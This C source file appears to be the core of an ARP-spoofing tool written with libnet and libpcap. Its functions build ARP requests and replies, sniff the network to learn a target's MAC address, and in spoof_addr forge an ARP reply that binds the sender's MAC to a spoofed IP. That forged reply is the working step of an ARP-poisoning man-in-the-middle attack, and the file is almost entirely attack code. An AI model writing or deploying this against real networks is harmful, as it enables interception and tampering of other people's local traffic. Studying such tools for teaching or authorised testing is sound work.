#include "arp_tools.h"

extern u_int32_t target_ip;
extern struct libnet_ether_addr * target_mac;
pcap_t * handle = NULL;
libnet_ptag_t arp_id, eth_id;

bool is_reply(struct ether_arp * arp_packet, u_int32_t target_ip)
{
  return (ntohs(arp_packet->ea_hdr.ar_op) == 2 && !memcmp(&target_ip, arp_packet->arp_spa, 4));
}

u_int32_t get_src_ip(libnet_t * l)
{
  int ip_addr;
  ip_addr = libnet_get_ipaddr4(l);

  if (ip_addr == -1)
  {
    fprintf(stderr, "[!] Couldn't get own IP address: %s\n", libnet_geterror(l));
    libnet_destroy(l);
    exit(EXIT_FAILURE);
  }

  return (u_int32_t) ip_addr;
}

struct libnet_ether_addr * get_src_mac(libnet_t * l)
{
  struct libnet_ether_addr * mac_addr = libnet_get_hwaddr(l);
  return mac_addr;
}

u_int32_t get_dst_ip(libnet_t * l, char * dst_mac)
{
  u_int32_t target = libnet_name2addr4(l, dst_mac, LIBNET_DONT_RESOLVE);
  return target;
}

  void build_arp_request
(
 struct libnet_ether_addr * src_mac, 
 u_int32_t * src_ip, 
 u_int32_t * dst_ip, 
 struct libnet_ether_addr * dst_mac, 
 libnet_t * l
 )
{

  if (libnet_build_arp
      (
       ARPHRD_ETHER,
       ETHERTYPE_IP,
       ETHER_ADDR_LEN, 4,
       ARPOP_REQUEST,
       (u_char *) src_mac, 
       (u_char *) src_ip, 
       (u_char *) dst_mac, 
       (u_char *) dst_ip,
       NULL, 0, l, 0
      ) == -1)
  {
    fprintf(stderr, "[!] Error building ARP header: %s\n",
        libnet_geterror(l));
    libnet_destroy(l);
    exit(EXIT_FAILURE);
  }

  if (libnet_build_ethernet
      (
       (u_int8_t *) dst_mac,
       (u_int8_t *) src_mac,
       ETHERTYPE_ARP, 
       NULL, 0, l, 0
      ) == -1)
  {
    fprintf(stderr, "[!] Error building ARP header: %s\n",
        libnet_geterror(l));
    libnet_destroy(l);
    exit(EXIT_FAILURE);

  }
  return;
}

  void build_arp_reply
(
 struct libnet_ether_addr * src_mac, 
 u_int32_t * src_ip, 
 u_int32_t * dst_ip, 
 struct libnet_ether_addr * dst_mac, 
 libnet_t * l
 )
{
  if (libnet_build_arp
      (
       ARPHRD_ETHER,
       ETHERTYPE_IP,
       ETHER_ADDR_LEN, 4,
       ARPOP_REPLY,
       (u_char *) src_mac, 
       (u_char *) src_ip, 
       (u_char *) dst_mac, 
       (u_char *) dst_ip,
       NULL, 0, l, 0
      ) == -1)
  {
    fprintf(stderr, "[!] Error building ARP header: %s\n",
        libnet_geterror(l));
    libnet_destroy(l);
    exit(EXIT_FAILURE);
  }

  if (libnet_build_ethernet
      (
       (u_int8_t *) dst_mac,
       (u_int8_t *) src_mac,
       ETHERTYPE_ARP, 
       NULL, 0, l, 0
      ) == -1)
  {
    fprintf(stderr, "[!] Error building ARP header: %s\n",
        libnet_geterror(l));
    libnet_destroy(l);
    exit(EXIT_FAILURE);

  }

  return;
}

  void callback
  (
   u_char *user __attribute__((unused)), 
   const struct pcap_pkthdr *header __attribute__((unused)), 
   const u_char *packet
  )
{
  struct ether_header * eth_header;
  struct ether_arp * arp_packet;
  eth_header = (struct ether_header *) packet;

  if (ntohs (eth_header->ether_type) == ETHERTYPE_ARP)
  {
    arp_packet = (struct ether_arp *) (packet + (ETHER_ADDR_LEN+ETHER_ADDR_LEN+2));
    if (is_reply(arp_packet, target_ip))
    {
      memcpy(target_mac->ether_addr_octet, eth_header->ether_shost, 6);
      printf("[!] target MAC address found\n");
      pcap_breakloop(handle);
    }	
  }
}

void find_target_mac(libnet_t * l)
{
  char * device = l->device;
  struct bpf_program fp;
  char errbuf[PCAP_ERRBUF_SIZE];
  int err;
  handle = pcap_open_live(device, 1500, 0, 2000, errbuf);

  if (pcap_datalink(handle) != DLT_EN10MB) 
  {
    fprintf(stderr, "[!] This program only supports Ethernet cards!\n");
    exit(EXIT_FAILURE);
  }

  char *filter = "arp";
  if (pcap_compile(handle, &fp, filter, 0, PCAP_NETMASK_UNKNOWN) == -1)
    pcap_perror(handle, "compile");

  if (pcap_setfilter(handle, &fp) == -1)
    pcap_perror(handle, "filter");

  if ((err = pcap_loop(handle, -1, callback, NULL)) < 0) 
  {
    if (err == -1) 
    {
      fprintf(stderr, "%s", pcap_geterr(handle));
      exit(EXIT_FAILURE);
    }
  }
  pcap_close(handle);
  return;
}

  void spoof_addr
(
 libnet_t * l, 
 u_int32_t * target_ip, 
 u_int32_t * spoof_ip, 
 struct libnet_ether_addr * mymac, 
 struct libnet_ether_addr * target_mac
 )
{
  libnet_ptag_t arp = 0;
  libnet_ptag_t eth = 0;

  if ((arp = libnet_build_arp
        (
         ARPHRD_ETHER,
         ETHERTYPE_IP,
         ETHER_ADDR_LEN, 4,
         ARPOP_REPLY,
         (u_char *) mymac, 
         (u_char *) spoof_ip, 
         (u_char *) target_mac, 
         (u_char *) target_ip,
         NULL, 0, l, 0
        )) == -1)
  {
    fprintf(stderr,
        "[!] Unable to build Ethernet header: %s\n", libnet_geterror (l));
    exit(EXIT_FAILURE);
  }

  eth = libnet_build_ethernet
    (
     (u_int8_t *) target_mac, 
     (u_int8_t *) mymac,
     ETHERTYPE_ARP, NULL, 0, l, 0
    );

  if (eth == -1)
  {
    fprintf(stderr,
        "[!] Unable to build Ethernet header: %s\n", libnet_geterror (l));
    exit(EXIT_FAILURE);
  }
  return;
}
